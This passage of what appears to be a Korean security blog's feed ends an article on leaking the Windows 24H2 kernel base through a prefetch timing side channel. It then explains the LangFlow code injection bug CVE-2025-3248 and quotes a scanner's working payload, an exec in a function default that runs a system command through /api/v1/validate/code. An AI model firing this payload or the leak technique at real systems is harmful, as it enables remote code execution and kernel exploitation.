&#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xCEE4;&#xB110; &#xC8FC;&#xC18C; &#xC911; &#xD558;&#xB098;&#xB77C;&#xB294; &#xC810;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xB294; &#xAC70;&#xC8E0;.</p><p>x86_64 &#xC544;&#xD0A4;&#xD14D;&#xCCD0;&#xB294; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C; &#x2194; &#xAC00;&#xC0C1;&#xC8FC;&#xC18C; &#xB9E4;&#xD551; &#xC2DC; &#xC790;&#xC8FC; &#xC811;&#xADFC;&#xD558;&#xB294; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; TLB(Translation Lookaside Buffer) &#xCE90;&#xC2DC;&#xAC00; &#xC788;&#xC73C;&#xBA70;, CPU &#xCE90;&#xC2DC;&#xC5D0; &#xC8FC;&#xC18C;&#xB97C; &#xBBF8;&#xB9AC; &#xAC00;&#xC838;&#xC624;&#xB294; prefetch instruction &#xB610;&#xD55C; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xD2B9;&#xC815; &#xC8FC;&#xC18C;&#xC5D0; &#xB300;&#xD574; prefetch &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294;&#xB370; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xAC00; &#xC774;&#xBBF8; TLB&#xC5D0; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74;? &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xAC80;&#xC0C9;&#xD574; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC778; page table walk&#xB97C; &#xC0DD;&#xB7B5;&#xD558;&#xACE0; TLB&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC624;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB418;&#xB2C8; &#xC2E4;&#xD589; &#xC2DC;&#xAC04;&#xC774; &#xBE68;&#xB77C;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image9.png" alt="image9.png"></p><blockquote><p>&#xD398;&#xC774;&#xC9C0;&#xC758; &#xCE90;&#xC2F1; &#xC5EC;&#xBD80;&#xC5D0; &#xB530;&#xB978; &#xC2E4;&#xD589;&#xC18D;&#xB3C4; &#xCC28;&#xC774;&#xB97C; &#xB098;&#xD0C0;&#xB0B8; &#xADF8;&#xB798;&#xD504;<br>&#xCD9C;&#xCC98;: <a href="https://gruss.cc/files/prefetch.pdf">https://gruss.cc/files/prefetch.pdf</a></p></blockquote><p>&#xC774;&#xB7EC;&#xD55C; &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xC758; &#xCC28;&#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; exploit&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>syscall&#xC744; &#xC5EC;&#xB7EC; &#xBC88; &#xC218;&#xD589;&#xD558;&#xC5EC; <code>entry_SYSCALL_64</code> &#xC8FC;&#xC18C;&#xAC00; TLB&#xC5D0; &#xCE90;&#xC2DC;&#xB418;&#xB3C4;&#xB85D; &#xB9CC;&#xB4EC;</li><li>&#xC608;&#xC0C1; &#xAC00;&#xB2A5;&#xD55C; &#xCEE4;&#xB110; &#xC8FC;&#xC18C; &#xBC94;&#xC704;&#xC5D0; &#xB300;&#xD574; prefetch instruction&#xC744; &#xD638;&#xCD9C;&#xD568;<ol><li>0xffffffff80000000 - 0xffffffffc0000000</li></ol></li><li>&#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xAC00; &#xB290;&#xB9AC;&#xB2E4;&#xBA74;, TLB&#xC5D0; &#xCE90;&#xC2DC;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBBC0;&#xB85C; 2&#xB85C; &#xB3CC;&#xC544;&#xAC00; &#xBC18;&#xBCF5;</li><li>&#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xAC00; &#xBE60;&#xB974;&#xB2E4;&#xBA74;, &#xCE90;&#xC2DC;&#xB41C; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xC778; <code>entry_SYSCALL_64</code> &#xC774;&#xBBC0;&#xB85C; &#xC624;&#xD504;&#xC14B; &#xACC4;&#xC0B0;&#xC744; &#xD1B5;&#xD574; KASLR &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD568;</li></ol><p><img src="image10.png" alt="image10.png"></p><blockquote><p>&#xCE90;&#xC2DC;&#xB41C; &#xC8FC;&#xC18C;&#xC758; prefetch &#xBA85;&#xB839;&#xC5B4; &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xB97C; &#xC774;&#xC6A9;&#xD55C; KASLR Leak &#xACFC;&#xC815;<br>&#xCD9C;&#xCC98;: <a href="https://gruss.cc/files/prefetch.pdf">https://gruss.cc/files/prefetch.pdf</a></p></blockquote><h3 id="Bypassing-KASLR-mitigation-in-24H2"><a href="#Bypassing-KASLR-mitigation-in-24H2" class="headerlink" title="Bypassing KASLR mitigation in 24H2"></a>Bypassing KASLR mitigation in 24H2</h3><p>&#xC55E;&#xC11C; EntryBleed&#xC758; prefetch sidechannel &#xAE30;&#xBC95;&#xC744; Windows&#xC5D0;&#xC11C;&#xB3C4; &#xC0AC;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;!</p><p>Windows&#xC5D0;&#xB3C4; KPTI&#xC640; &#xC720;&#xC0AC;&#xD55C; &#xAC1C;&#xB150;&#xC758; mitigation&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Meltdown, Spectre &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xACF5;&#xAC1C;&#xB41C; &#xC2DC;&#xAE30; MS&#xB3C4; &#xC5ED;&#xC2DC; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC801;&#xC73C;&#xB85C; &#xC644;&#xD654;&#xD558;&#xAE30; &#xC704;&#xD574; &#xCEE4;&#xB110;-&#xC720;&#xC800; &#xAC04; &#xBA54;&#xBAA8;&#xB9AC; &#xACA9;&#xB9AC; &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xC744; &#xCD94;&#xAC00;&#xD588;&#xB294;&#xB370;, &#xADF8;&#xAC8C; &#xBC14;&#xB85C;  <strong>KVA(Kernel Virtual Address) Shadow</strong>&#xB77C;&#xB294; &#xB140;&#xC11D;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; KVAS&#xB294; &#xCD5C;&#xADFC; Windows &#xBE4C;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="image11.png" alt="image11.png"></p><p>KVAS&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0; &#xC720;&#xC800; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>KPROCESS.userdirectorytablebase</code> &#xC5D0; &#xC720;&#xD6A8;&#xD55C; &#xC8FC;&#xC18C; &#xAC12;&#xC774; &#xB4E4;&#xC5B4;&#xAC00;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, 0&#xC778; &#xAC78; &#xBCF4;&#xC544; &#xBE44;&#xD65C;&#xC131;&#xD654; &#xB41C; &#xAC78; &#xC54C; &#xC218; &#xC788;&#xB124;&#xC694;. &#xCD5C;&#xADFC; Windows &#xC758; &#xCD5C;&#xC18C; &#xC694;&#xAD6C;&#xC0AC;&#xD56D;&#xC744; &#xCDA9;&#xC871;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xB294; Meltdown&#xACFC; Spectre&#xC758; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC9C0; &#xC54A;&#xC73C;&#xB2C8; &#xC131;&#xB2A5; &#xC800;&#xD558;&#xB97C; &#xC77C;&#xC73C;&#xD0A4;&#xB294; KVAS&#xB97C; &#xAD73;&#xC774; &#xC801;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xB41C;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD55C; &#xAC8C; &#xC544;&#xB2D0;&#xAE4C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xBB34;&#xD2BC;! KVAS&#xAC00; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xB294; &#xAC74; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xAC00; &#xC788;&#xB2E4;&#xB294; &#xB73B;&#xC774;&#xACA0;&#xC8E0;? &#xADF8;&#xB7FC; EntryBleed&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB41C; prefetch &#xAE30;&#xBC95;&#xC744; &#xC801;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. exploits-forsale&#xC5D0;&#xC11C; &#xACF5;&#xAC1C;&#xD55C; PoC &#xC911; sidechannel Procedure&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image12.png" alt="image12.png"></p><blockquote><p><a href="https://github.com/exploits-forsale/prefetch-tool/blob/main/prefetch_tool/prefetch_asm.asm">https://github.com/exploits-forsale/prefetch-tool/blob/main/prefetch_tool/prefetch_asm.asm</a></p></blockquote><ul><li>&#xC8FC;&#xD669;&#xC0C9; &#xBC15;&#xC2A4;<ul><li>prefetch&#xD560; &#xCCAB; &#xBC88;&#xC9F8; argument(rcx) &#xBC1B;&#xC74C;</li></ul></li><li>&#xBE68;&#xAC04;&#xC0C9; &#xBC15;&#xC2A4;<ul><li><strong>prefetchnta&#xC744; &#xD1B5;&#xD574;</strong> non-temporal&#xC784;&#xC744; &#xBA85;&#xC2DC;&#xD558;&#xACE0;, <strong>prefetcht2</strong>&#xC744; &#xD1B5;&#xD574; &#xD53C;&#xC5F0;&#xC0B0;&#xC790; &#xC8FC;&#xC18C;&#xB97C; Level 2 &#xCE90;&#xC2DC;&#xB85C; &#xB85C;&#xB4DC;&#xD568;</li><li>&#xC704; &#xB450; &#xAC00;&#xC9C0; &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xC2E4;&#xD589; &#xC2DC;&#xAC04;&#xC744; &#xCE21;&#xC815;&#xD558;&#xACE0; TLB&#xC5D0; &#xCE90;&#xC2DC;&#xB41C; &#xC8FC;&#xC18C;&#xC778;&#xC9C0; &#xD310;&#xB2E8;&#xD568;</li></ul></li><li>&#xD30C;&#xB780;&#xC0C9; &#xBC15;&#xC2A4;<ul><li>&#xBE68;&#xAC04;&#xC0C9; &#xBC15;&#xC2A4;&#xC758; &#xC2E4;&#xD589; &#xC2DC;&#xAC04;&#xC744; &#xCE21;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD574; lfence/mfence &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD65C;&#xC6A9;&#xD568;</li><li>instruction &#xC9C1;&#xB82C;&#xD654; &#xC791;&#xC5C5;&#xC744; &#xD1B5;&#xD574; &#xC2E4;&#xD589; &#xC2DC;&#xAC04; &#xCE21;&#xC815;(lfence, mfence)<ul><li>&#xC774;&#xC804;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB85C;&#xB4DC;&#xB41C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xBAA8;&#xB450; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xC9C4;&#xC785;</li><li>Instruction &#xC2E4;&#xD589; &#xC21C;&#xC11C; &#xAC15;&#xC81C;, &#xCD5C;&#xC801;&#xD654; &#xC81C;&#xAC70;</li></ul></li></ul></li></ul><p><img src="image13.png" alt="image13.png"></p><p>&#xC81C; &#xD658;&#xACBD;&#xC778; 13&#xC138;&#xB300; Intel &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC5D0;&#xC11C;&#xB294; &#xB2E8; &#xBA87; &#xCD08; &#xB9CC;&#xC5D0; ntoskrnl.exe &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xC774; &#xBC29;&#xBC95;&#xB3C4; &#xBA87; &#xAC00;&#xC9C0; &#xC81C;&#xC57D;&#xC0AC;&#xD56D;&#xC774; &#xC788;&#xB294;&#xB370;&#xC694;.</p><p>&#xCCAB; &#xBC88;&#xC9F8;&#xB294; &#xCD5C;&#xC2E0; intel&#xC758; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC5D0;&#xC11C;&#xB9CC; reliable&#xD558;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xACE0; AMD &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC5D0;&#xC11C;&#xB294; &#xC2E0;&#xB8B0;&#xC131;&#xC774; &#xADF8;&#xB2E5; &#xB192;&#xC9C0; &#xC54A;&#xB2E4;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC73C;&#xBA70;, &#xB450; &#xBC88;&#xC9F8;&#xB85C;&#xB294; &#xC5EC;&#xB7EC; &#xCEE4;&#xB110; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;(KTHRED, Pool) &#xC8FC;&#xC18C;&#xB3C4; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xB358; &#xAE30;&#xC874;&#xC758; <code>NtQuerySystemInformation</code> &#xBC29;&#xBC95;&#xC5D0; &#xBE44;&#xD574; &#xCEE4;&#xB110; &#xC774;&#xBBF8;&#xC9C0; &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C;&#xB9CC; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xC0C1;&#xB300;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC6A9;&#xB3C4;&#xAC00; &#xB5A8;&#xC5B4;&#xC9C4;&#xB2E4;&#xB294; &#xB2E8;&#xC810;&#xB3C4; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xACB0;&#xAD6D; 24H2&#xC5D0; &#xCD94;&#xAC00;&#xB41C; <code>NtQuerySystemInformaton</code> &#xAD8C;&#xD55C; &#xC81C;&#xD55C;&#xC740; &#xCEE4;&#xB110; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC0C1;&#xB2F9;&#xD55C; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xC5C8;&#xB2E4;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;. <del>+ &#xC55E;&#xC73C;&#xB85C; &#xCEE4;&#xB110;&#xD558;&#xB824;&#xBA74; CPU &#xB9E4;&#xB274;&#xC5BC;&#xC744; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBD10;&#xC57C;&#xD558;&#xB294;&#xAC74;&#xAC00;..</del></p><h2 id="&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;"></a>&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;</h2><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; Windows Kernel Exploit&#xC758; &#xAD6D;&#xBC25;&#xC774;&#xC5C8;&#xB358; <code>NtQuerySystemInformaton</code> &#xAD8C;&#xD55C; &#xD328;&#xCE58;&#xC640;, &#xADF8;&#xB85C; &#xC778;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; KASLR bypass &#xD14C;&#xD06C;&#xB2C9;&#xC758; &#xD544;&#xC694;&#xC131;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xB4F1;&#xC7A5;&#xD55C; sidechannel&#xC744; &#xD65C;&#xC6A9;&#xD55C; Kernel Leak &#xAE30;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAC1C;&#xC778;&#xC801;&#xC778; &#xC758;&#xACAC;&#xC73C;&#xB85C;&#xB294; &#xADF8;&#xB3D9;&#xC548; Windows&#xC758; KASLR &#xC6B0;&#xD68C; &#xC5F0;&#xAD6C;&#xAC00; <code>NtQuerySystemInformaton</code> &#xC758; &#xC874;&#xC7AC; &#xB54C;&#xBB38;&#xC5D0; &#xD65C;&#xBC1C;&#xD558;&#xAC8C; &#xC5F0;&#xAD6C;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC9C0;&#xB9CC;, &#xC774;&#xBC88; 24H2&#xB85C; &#xAD8C;&#xD55C; &#xD328;&#xCE58;&#xAC00; &#xC0DD;&#xAE30;&#xBA74;&#xC11C; &#xC55E;&#xC73C;&#xB85C; &#xC0C8;&#xB85C;&#xC6B4; &#xC6B0;&#xD68C; &#xBC29;&#xBC95;&#xC774; &#xC5F0;&#xAD6C;&#xB418;&#xAE38; &#xAE30;&#xB300;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC; &#xB2E4;&#xC74C; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; I/O Ring exploit&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://windows-internals.com/kaslr-leaks-restriction/">https://windows-internals.com/kaslr-leaks-restriction/</a></p><p><a href="https://exploits.forsale/24h2-nt-exploit/">https://exploits.forsale/24h2-nt-exploit/</a></p><p><a href="https://github.com/exploits-forsale/prefetch-tool">https://github.com/exploits-forsale/prefetch-tool</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/mitigation/">mitigation</category>
      
      <category domain="https://hackyboiz.github.io/tags/kaslr/">kaslr</category>
      
      <category domain="https://hackyboiz.github.io/tags/entrybleed/">entrybleed</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-3248: LangFlow Code Injection Vulnerability</title>
      <link>https://hackyboiz.github.io/2025/04/13/mungsul/2025-04-12/</link>
      <guid>https://hackyboiz.github.io/2025/04/13/mungsul/2025-04-12/</guid>
      <pubDate>Sun, 13 Apr 2025 02:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/xuemian168/CVE-2025-3248/&quot;&gt;https</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/xuemian168/CVE-2025-3248/">https://github.com/xuemian168/CVE-2025-3248/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>LangFlow &lt; 1.3.0 </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>AI &#xC5D0;&#xC774;&#xC804;&#xD2B8; &#xBE4C;&#xB4DC; &#xBC0F; &#xBC30;&#xD3EC; &#xB3C4;&#xAD6C;&#xC778; LangFlow &#xC5D0;&#xC11C; Code Injection &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>LLM &#xC774; &#xC0DD;&#xC131;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; API &#xC778; <code>/api/v1/validate/code</code> &#xC5D0;&#xC11C; <code>exec</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xD568;&#xC218;&#xC778; <code>validate_code()</code> &#xB97C; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xB2F9; API &#xB97C; &#xC544;&#xBB34;&#xB098; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xAE30;&#xC5D0; [1], &#xD604;&#xC7AC; &#xC0AC;&#xC6A9;&#xC790;&#xB9CC; &#xC774;&#xC6A9; &#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. [2]</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> APIRouter, HTTPException<span class="hljs-keyword">from</span> loguru <span class="hljs-keyword">import</span> logger<span class="hljs-keyword">from</span> langflow.api.v1.base <span class="hljs-keyword">import</span> Code, CodeValidationResponse, PromptValidationResponse, ValidatePromptRequest<span class="hljs-keyword">from</span> langflow.base.prompts.api_utils <span class="hljs-keyword">import</span> process_prompt_template<span class="hljs-keyword">from</span> langflow.utils.validate <span class="hljs-keyword">import</span> validate_code<span class="hljs-comment"># build router</span>router = APIRouter(prefix=<span class="hljs-string">&quot;/validate&quot;</span>, tags=[<span class="hljs-string">&quot;Validate&quot;</span>])<span class="hljs-meta">@router.post(&quot;/code&quot;, status_code=200)</span>-<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post_validate_code</span>(<span class="hljs-params">code: Code</span>) -&gt; CodeValidationResponse:</span> <span class="hljs-comment"># [1]</span>+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post_validate_code</span>(<span class="hljs-params">code: Code, current_user: CurrentActiveUser</span>) -&gt; CodeValidationResponse:</span> [<span class="hljs-number">2</span>]    <span class="hljs-keyword">try</span>:        errors = validate_code(code.code)        <span class="hljs-keyword">return</span> CodeValidationResponse(            imports=errors.get(<span class="hljs-string">&quot;imports&quot;</span>, {}),            function=errors.get(<span class="hljs-string">&quot;function&quot;</span>, {}),        )    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        logger.opt(exception=<span class="hljs-literal">True</span>).debug(<span class="hljs-string">&quot;Error validating code&quot;</span>)        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">500</span>, detail=str(e)) <span class="hljs-keyword">from</span> e</code></pre><p><code>validate_code()</code> &#xB294; POST &#xB85C; &#xC804;&#xB2EC;&#xBC1B;&#xC740; <code>code</code> &#xC5D0; import &#xBB38;&#xACFC; python &#xD568;&#xC218; &#xC120;&#xC5B8;&#xBB38;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778; &#xD558;&#xC5EC; import &#xBB38;&#xC774; &#xC788;&#xB294; &#xACBD;&#xC6B0; &#xC774;&#xB984;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xBAA8;&#xB4C8;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xACE0; [3] , &#xD568;&#xC218;&#xAC00; &#xC120;&#xC5B8;&#xB418;&#xC5C8;&#xC744; &#xACBD;&#xC6B0; <code>exec</code> &#xB97C; &#xD1B5;&#xD574; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. [4]</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">validate_code</span>(<span class="hljs-params">code</span>):</span>    <span class="hljs-comment"># Initialize the errors dictionary</span>    errors = {<span class="hljs-string">&quot;imports&quot;</span>: {<span class="hljs-string">&quot;errors&quot;</span>: []}, <span class="hljs-string">&quot;function&quot;</span>: {<span class="hljs-string">&quot;errors&quot;</span>: []}}    <span class="hljs-comment"># Parse the code string into an abstract syntax tree (AST)</span>    <span class="hljs-keyword">try</span>:        tree = ast.parse(code)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:  <span class="hljs-comment"># noqa: BLE001</span>        <span class="hljs-keyword">if</span> hasattr(logger, <span class="hljs-string">&quot;opt&quot;</span>):            logger.opt(exception=<span class="hljs-literal">True</span>).debug(<span class="hljs-string">&quot;Error parsing code&quot;</span>)        <span class="hljs-keyword">else</span>:            logger.debug(<span class="hljs-string">&quot;Error parsing code&quot;</span>)        errors[<span class="hljs-string">&quot;function&quot;</span>][<span class="hljs-string">&quot;errors&quot;</span>].append(str(e))        <span class="hljs-keyword">return</span> errors    <span class="hljs-comment"># Add a dummy type_ignores field to the AST</span>    add_type_ignores()    tree.type_ignores = []    <span class="hljs-comment"># Evaluate the import statements</span>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> tree.body:        <span class="hljs-keyword">if</span> isinstance(node, ast.Import):            <span class="hljs-keyword">for</span> alias <span class="hljs-keyword">in</span> node.names:                <span class="hljs-keyword">try</span>:                    importlib.import_module(alias.name) <span class="hljs-comment"># [3]</span>                <span class="hljs-keyword">except</span> ModuleNotFoundError <span class="hljs-keyword">as</span> e:                    errors[<span class="hljs-string">&quot;imports&quot;</span>][<span class="hljs-string">&quot;errors&quot;</span>].append(str(e))    <span class="hljs-comment"># Evaluate the function definition</span>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> tree.body:        <span class="hljs-keyword">if</span> isinstance(node, ast.FunctionDef):            code_obj = compile(ast.Module(body=[node], type_ignores=[]), <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>)            <span class="hljs-keyword">try</span>:                exec(code_obj) <span class="hljs-comment"># [4]</span>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:  <span class="hljs-comment"># noqa: BLE001</span>                logger.opt(exception=<span class="hljs-literal">True</span>).debug(<span class="hljs-string">&quot;Error executing function code&quot;</span>)                errors[<span class="hljs-string">&quot;function&quot;</span>][<span class="hljs-string">&quot;errors&quot;</span>].append(str(e))</code></pre><p>&#xACF5;&#xAC1C;&#xB41C; CVE-2025-3248 &#xC2A4;&#xCE90;&#xB108;(<a href="https://github.com/xuemian168/CVE-2025-3248/">link</a>)&#xC5D0;&#xC11C;&#xB294; &#xC704; &#xADDC;&#xCE59;&#xC5D0; &#xB9DE;&#xAC8C; python &#xD568;&#xC218;&#xB97C; &#xC120;&#xC5B8;&#xD558;&#xBA70; &#xC2DC;&#xC2A4;&#xD15C; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; &#xAD6C;&#xBB38;&#xC744; &#xC0BD;&#xC785;&#xD55C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. [5]</p><pre><code class="hljs python"><span class="hljs-comment"># &#xC2A4;&#xCE90;&#xB108; &#xCF54;&#xB4DC; &#xC77C;&#xBD80; &#xBC1C;&#xCDCC;</span>...    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_vulnerability</span>(<span class="hljs-params">self</span>):</span>        <span class="hljs-string">&quot;&quot;&quot;Check if target is vulnerable to Langflow vulnerability&quot;&quot;&quot;</span>        <span class="hljs-keyword">try</span>:            validate_url = urljoin(self.url, <span class="hljs-string">&apos;/api/v1/validate/code&apos;</span>)            payload = {                <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">def test(cd=exec(&apos;raise Exception(__import__(&quot;subprocess&quot;).check_output(&quot;whoami&quot;, shell=True))&apos;)):</span><span class="hljs-string">    pass</span><span class="hljs-string">&quot;&quot;&quot;</span>  <span class="hljs-comment"># [5] </span>            }                        print(<span class="hljs-string">f&quot;<span class="hljs-subst">{Fore.YELLOW}</span>[*] Testing endpoint: <span class="hljs-subst">{validate_url}</span>&quot;</span>)            response = self.session.post(                validate_url,                 json=payload,                 timeout=self.timeout            )  ...</code></pre><p>&#xC5EC;&#xB2F4;&#xC774;&#xC9C0;&#xB9CC;, &#xD574;&#xB2F9; &#xD328;&#xCE58;&#xB85C; Preauth 